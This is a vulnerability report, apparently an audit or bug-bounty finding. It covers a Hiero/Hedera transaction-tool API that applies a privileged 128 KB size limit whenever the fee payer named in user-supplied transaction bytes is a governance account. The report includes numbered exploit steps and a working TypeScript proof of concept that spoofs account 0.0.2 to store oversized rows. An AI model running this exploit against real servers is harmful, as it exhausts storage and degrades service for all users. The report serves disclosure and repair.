### Title
Unprivileged Users Can Bypass the 6 KB Transaction Size Limit by Spoofing a Privileged Fee Payer Account ID

### Summary
The `POST /transactions` API endpoint validates transaction size using the fee payer account embedded inside the attacker-controlled `transactionBytes`, without verifying that the submitting user actually controls that fee payer account. Any authenticated user can set a privileged governance account (e.g., `0.0.2`, `0.0.42`–`0.0.799`) as the fee payer in the transaction's `transactionId`, causing the backend to apply the 128 KB HIP-1300 privileged limit instead of the standard 6 KB limit. This allows a normal user to store transactions that are up to 21× larger than permitted, enabling database storage exhaustion.

### Finding Description

**Root cause**: `validateAndPrepareTransaction` in `back-end/apps/api/src/transactions/transactions.service.ts` calls `isTransactionBodyOverMaxSize(sdkTransaction)` to enforce the size limit. That function resolves the limit by reading the fee payer account from the transaction's own `transactionId` field — a field that is entirely user-supplied and never cross-checked against the submitting user's registered accounts.

```
POST /transactions
  → createTransaction (line 389)
  → createTransactions (line 400)
  → validateAndPrepareTransaction (line 896)
      line 910: publicKey.verify(dto.transactionBytes, dto.signature)  ← only checks user's key signed the bytes
      line 929: isTransactionBodyOverMaxSize(sdkTransaction)            ← limit derived from fee payer inside bytes
``` [1](#0-0) 

`isTransactionBodyOverMaxSize` calls `getMaxTransactionSizeForTransaction`, which calls `isPrivilegedFeePayer` on the account ID extracted from `tx.transactionId.accountId`: [2](#0-1) [3](#0-2) 

If the fee payer is `0.0.2` or in `0.0.42–0.0.799`, the limit becomes `MAX_PRIVILEGED_TRANSACTION_BYTE_SIZE = 131_072` (128 KB) instead of `MAX_TRANSACTION_BYTE_SIZE = 6_144` (6 KB): [4](#0-3) 

The signature check (`publicKey.verify`) only confirms that the user's registered key signed the raw bytes. It does not verify that the fee payer account in the `transactionId` belongs to the submitting user. The Hedera SDK allows any account ID to be placed in `transactionId.accountId` without cryptographic proof of ownership at construction time.

Both `transactionBytes` and `unsignedTransactionBytes` are stored as unbounded `bytea` columns with no database-level size constraint: [5](#0-4) 

**Exploit flow**:
1. Attacker registers a normal user account (e.g., `0.0.1001`) and registers a key pair.
2. Attacker constructs a `FileUpdateTransaction` with `transactionId` set to `0.0.2@<validStart>` (treasury as fee payer) and fills `contents` with ~128 KB of arbitrary data.
3. Attacker signs the raw `transactionBytes` with their own registered private key.
4. Attacker submits `POST /transactions` with the signed bytes and their `creatorKeyId`.
5. Backend: signature check passes (user's key signed the bytes), size check passes (128 KB limit applies because fee payer is `0.0.2`), transaction is stored in the database.
6. Repeat with different `validStart` timestamps to store unlimited 128 KB records.

### Impact Explanation
Each stored transaction occupies up to 128 KB × 2 (both `transactionBytes` and `unsignedTransactionBytes` columns) = 256 KB per row, versus the intended 12 KB. The user-level rate limit is 100 requests/minute and 10 requests/second. At maximum rate, a single attacker can write ~12.8 MB/minute to the database (vs ~600 KB/minute under the correct 6 KB limit). With multiple accounts, this scales linearly. There is no per-user storage quota or total transaction count cap. The result is unbounded database growth leading to storage exhaustion and service degradation for all users of the organization server.

### Likelihood Explanation
The attack requires only a valid authenticated account and a registered key — the minimum access level for any user of the tool. No privileged credentials, no admin access, and no special knowledge beyond the HIP-1300 account range (publicly documented) are needed. The `POST /transactions` endpoint is the primary workflow entry point, making it trivially reachable. The exploit is deterministic and reproducible with standard Hiero SDK calls.

### Recommendation
In `validateAndPrepareTransaction`, after parsing the SDK transaction, verify that the fee payer account (`sdkTransaction.transactionId.accountId`) matches one of the submitting user's registered accounts before applying the privileged size limit. Concretely:

```typescript
// After parsing sdkTransaction:
const feePayer = sdkTransaction.transactionId?.accountId?.toString();
const userOwnsFeePayer = user.keys.some(k => k.accountId === feePayer);
const effectiveMaxSize = (userOwnsFeePayer && isPrivilegedFeePayer(sdkTransaction.transactionId?.accountId))
  ? MAX_PRIVILEGED_TRANSACTION_BYTE_SIZE
  : MAX_TRANSACTION_BYTE_SIZE;
if (getTransactionBodyBytes(sdkTransaction).length > effectiveMaxSize) {
  throw new BadRequestException(ErrorCodes.TOS);
}
```

Alternatively, always apply the standard 6 KB limit at the API layer and only relax it for transactions whose fee payer is verified to be a governance account controlled by the organization (not by the submitting user).

### Proof of Concept

```typescript
import {
  FileUpdateTransaction, FileId, TransactionId, AccountId, Timestamp, PrivateKey
} from '@hiero-ledger/sdk';

// Attacker's own key (registered with the backend)
const attackerKey = PrivateKey.generateED25519();

// Craft a ~128 KB transaction claiming treasury (0.0.2) as fee payer
const tx = new FileUpdateTransaction()
  .setFileId(FileId.fromString('0.0.150'))
  .setContents(Buffer.alloc(127_000, 0x41))          // ~127 KB of 'A'
  .setTransactionId(
    TransactionId.withValidStart(
      AccountId.fromString('0.0.2'),                  // privileged fee payer — attacker does NOT control this
      Timestamp.fromDate(new Date()),
    ),
  );

const txBytes = tx.toBytes();
const signature = attackerKey.sign(txBytes);

// POST /transactions — backend accepts this because:
//   1. signature check: attacker's registered key signed the bytes ✓
//   2. size check: fee payer is 0.0.2 → 128 KB limit applies ✓
//   3. 127 KB < 128 KB → isTransactionBodyOverMaxSize returns false ✓
const payload = {
  name: 'bloat',
  description: 'storage exhaustion',
  transactionBytes: Buffer.from(txBytes).toString('hex'),
  creatorKeyId: <attacker_registered_key_id>,
  signature: Buffer.from(signature).toString('hex'),
  mirrorNetwork: 'mainnet',
};
// → HTTP 201, 127 KB stored in database
// Repeat with different validStart to store unlimited rows
```

Expected result: the backend returns HTTP 201 and stores a ~127 KB transaction. Without the vulnerability, the same transaction with a normal fee payer would be rejected with `ErrorCodes.TOS` (transaction oversized).

export function isTransactionBodyOverMaxSize(transaction: SDKTransaction) {
  const bodyBytes = getTransactionBodyBytes(transaction);
  // HIP-1300: limit depends on the fee payer (privileged accounts get 128 KB).
  const maxSize = getMaxTransactionSizeForTransaction(transaction);
  return bodyBytes.length > maxSize;
}

export function isPrivilegedFeePayer(accountId: AccountId | null | undefined): boolean {
  if (!accountId) return false;
  if (accountId.shard.toNumber() !== 0 || accountId.realm.toNumber() !== 0) return false;
  const num = accountId.num.toNumber();
  return num === 2 || (num >= 42 && num <= 799);
}
